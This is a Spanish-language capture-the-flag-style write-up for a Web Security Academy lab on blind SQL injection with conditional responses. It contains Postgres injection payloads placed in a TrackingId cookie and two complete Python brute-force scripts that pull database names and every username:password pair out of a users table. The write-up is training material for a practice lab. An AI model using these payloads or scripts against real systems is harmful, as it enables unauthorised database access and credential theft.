---
title: "11 - Blind SQL injection with conditional responses"
---

# 11 - Blind SQL injection with conditional responses

Postgres:
```r
Cookie: TrackingId=KKNUG8ThvyvLfMIx'+AND+SUBSTRING('foo',1,1)='f'+--+-;
```

Sacamos la primera letra de la primera base de datos:
```r
TrackingId=a'+OR+(SELECT+SUBSTRING(datname,1,1)+FROM+pg_database+LIMIT+1)='§a§'+--+-
```

Sacamos la primera letra de la primera base de datos:
``` R
TrackingId=a'+OR+(SELECT+SUBSTRING(datname,1,1)+FROM+pg_database+LIMIT+1+OFFSET+0)='§a§'+--+-
```

Sacamos  nombres de las base de datos iterando sobre el offset : 

```python
#!/usr/bin/env python3

from asyncio import log
import string
from pwn import *
import requests, sys, signal, time, pdb, urllib3
from urllib.parse import quote

def sig_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, sig_handler)

proxies = {
    "http": "http://127.0.0.1:8080"
}

#Variables Globales
characters= string.ascii_lowercase + string.ascii_uppercase + string.digits + '_'
url= "https://0af3003d0390381482d0ba1300ed0005.web-security-academy.net/product?productId=6"

def makeSQLI():
	s=requests.session()
	s.verify = False

	p1= log.progress("Fuerza Bruta")
	p1.status("Iniciando proceso de fuerza bruta")

	time.sleep(2)

	p2= log.progress("Database")

	database= ""
	
	urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

	for position in range(1,12): #Rango 1 - (tamaño database + 1)
		for character in characters:
			payload=f"a'+OR+(SELECT+SUBSTRING(datname,{position},1)+FROM+pg_database+LIMIT+1+OFFSET+0)='{character}'+--+-"
			cookies = {
    			"TrackingId": f"{payload}",
    			"session": "x2qQdmeLG3kmnEjJ74TQmN18zIyPK1Hf"
			}
			p1.status(payload)
			#url = quote(url, safe=':/?&=.,')
			r = s.get(url,cookies=cookies,verify=False,proxies=proxies)
			if "Welcome" in r.text :
				database += character
				p2.status(database)
				break

if __name__ == '__main__':
	makeSQLI()

```


Sacamos nombre de las tablas iterando sobre offset:

```python
payload=f"a'+OR+(SELECT+SUBSTRING(table_name,{position},1)+FROM+information_schema.tables+WHERE+table_type+=+'BASE+TABLE'+AND+table_schema+NOT+IN+('pg_catalog','information_schema')+LIMIT+1+OFFSET+0)='{character}'+--+-"
```

Sacamos el nombre de las columnas iterando sobre offset:
```python
payload=f"a'+OR+(SELECT+SUBSTRING(column_name,{position},1)+FROM+information_schema.columns+WHERE+table_schema='public'+AND+table_name='users'+LIMIT+1+OFFSET+0)='{character}'+--+-"
```

Modificando el bucle externo para que itere sobre las coincidencias y nos permita sacar todos los pares usuario : contraseña de la tabla users

```python
#!/usr/bin/env python3

from asyncio import log
import string
from pwn import *
import requests, sys, signal, time, pdb, urllib3
from urllib.parse import quote

def sig_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, sig_handler)

proxies = {
    "http": "http://127.0.0.1:8080"
}

#Variables Globales
characters= string.ascii_lowercase + string.ascii_uppercase + string.digits + '_' + ':'
url= "https://0a31002d039dad5b84a50fcf00270041.web-security-academy.net/product?productId=10"

def makeSQLI():
	s=requests.session()
	s.verify = False

	p1= log.progress("Fuerza Bruta")
	p1.status("Iniciando proceso de fuerza bruta")

	time.sleep(2)

	p2= log.progress("Contenido")

	resultado= ""
	
	urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

	for offset in range(0,5):
		found=True
		position=1
		while found :
			found=False
			for character in characters:
				payload=f"a'+OR+(SELECT+SUBSTRING((username||':'||password),{position},1)+FROM+users+LIMIT+1+OFFSET+{offset})='{character}'+--+-"
				cookies = {
					"TrackingId": f"{payload}",
					"session": "5sG9HfnXEWQzs2eFolXOUpTFydSLC7ru"
				}
				p1.status(payload)
				#url = quote(url, safe=':/?&=.,')
				r = s.get(url,cookies=cookies,verify=False,proxies=proxies)
				if "Welcome" in r.text :
					resultado += character
					p2.status(resultado)
					position+=1
					found=True
					break
		resultado+='\n'


if __name__ == '__main__':
	makeSQLI()

```
